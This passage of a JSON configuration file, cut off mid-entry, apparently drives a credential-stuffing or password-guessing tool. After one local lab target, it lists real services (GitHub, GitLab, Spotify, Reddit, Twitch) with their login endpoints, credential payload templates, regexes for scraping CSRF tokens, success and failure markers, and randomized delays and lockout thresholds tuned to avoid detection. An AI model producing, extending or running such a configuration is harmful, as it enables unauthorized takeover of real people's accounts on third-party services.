{
  "lab": {
    "name": "Local Lab",
    "login": {
      "url": "http://127.0.0.1:5000/login",
      "method": "POST",
      "payload": {"username": "{ID}", "password": "{PASS}"},
      "requires_token": false,
      "failure_markers": ["invalid credentials"],
      "success_markers": ["welcome"],
      "lockout_markers": ["account locked", "too many", "try again later"],
      "rate": {"max_per_minute": 30, "delay_min": 0.5, "delay_max": 1.5, "lockout_after": 8, "on_lockout": "wait", "cooldown_seconds": 60}
    }
  },
  "github": {
    "name": "GitHub",
    "login": {
      "url": "https://github.com/session",
      "method": "POST",
      "payload": {"login": "{ID}", "password": "{PASS}", "authenticity_token": "{TOKEN}", "commit": "Sign in"},
      "requires_token": true,
      "token_source": {"url": "https://github.com/login", "regex": "name=\"authenticity_token\" value=\"([^\"]+)\""},
      "failure_markers": ["incorrect username or password", "did not match"],
      "success_redirects": ["/"],
      "lockout_markers": ["rate limit", "many attempts", "captcha", "login attempts"],
      "rate": {"max_per_minute": 8, "delay_min": 2, "delay_max": 5, "lockout_after": 12, "on_lockout": "wait", "cooldown_seconds": 300}
    }
  },
  "gitlab": {
    "name": "GitLab",
    "login": {
      "url": "https://gitlab.com/users/sign_in",
      "method": "POST",
      "payload": {"user[login]": "{ID}", "user[password]": "{PASS}", "authenticity_token": "{TOKEN}"},
      "requires_token": true,
      "token_source": {"url": "https://gitlab.com/users/sign_in", "regex": "name=\"authenticity_token\" value=\"([^\"]+)\""},
      "failure_markers": ["invalid login or password", "invalid credentials"],
      "success_redirects": ["/"],
      "lockout_markers": ["many failed login attempts", "rate limit", "blocked"],
      "rate": {"max_per_minute": 8, "delay_min": 2, "delay_max": 5, "lockout_after": 10, "on_lockout": "wait", "cooldown_seconds": 300}
    }
  },
  "spotify": {
    "name": "Spotify",
    "login": {
      "url": "https://accounts.spotify.com/api/login",
      "method": "POST",
      "payload": {"username": "{ID}", "password": "{PASS}", "csrf_token": "{TOKEN}"},
      "requires_token": true,
      "token_source": {"url": "https://accounts.spotify.com/en/login", "regex": "csrf_token\" value=\"([^\"]+)\""},
      "failure_markers": ["incorrect username or password", "wrong password"],
      "success_markers": ["auth_token"],
      "lockout_markers": ["captcha", "too many", "rate limit"],
      "rate": {"max_per_minute": 4, "delay_min": 4, "delay_max": 8, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 900}
    }
  },
  "reddit": {
    "name": "Reddit",
    "login": {
      "url": "https://www.reddit.com/api/login",
      "method": "POST",
      "payload": {"user": "{ID}", "passwd": "{PASS}", "api_type": "json", "rem": "true"},
      "requires_token": false,
      "failure_markers": ["wrong password", "invalid login"],
      "success_markers": ["\"success\": true"],
      "lockout_markers": ["too many requests", "rate", "captcha"],
      "rate": {"max_per_minute": 5, "delay_min": 3, "delay_max": 6, "lockout_after": 4, "on_lockout": "abort", "cooldown_seconds": 600}
    }
  },
  "twitch": {
    "name": "Twitch",
    "login": {
      "url": "https://passport.twitch.tv/protected/login",
      "method": "POST",
      "payload": {"username": "{ID}", "password": "{PASS}", "client_id": "kd1unb4b3q4tbnfckf0f4d8f", "client_version": "1.0", "undelete_user": "false", "remember_me": "true"},
      "requires_token": false,
      "failure_markers": ["incorrect username or password", "invalid password"],
      "success_markers": ["access_token"],
      "lockout_markers": ["too many", "captcha", "rate"],
      "rate": {"max_per_minute": 5, "delay_min": 3, "delay_max": 7, "lockout_after": 4, "on_lockout": "abort", "cooldown_seconds": 600}
    }
  },
  "epicgames": {
    "name": "Epic Games",
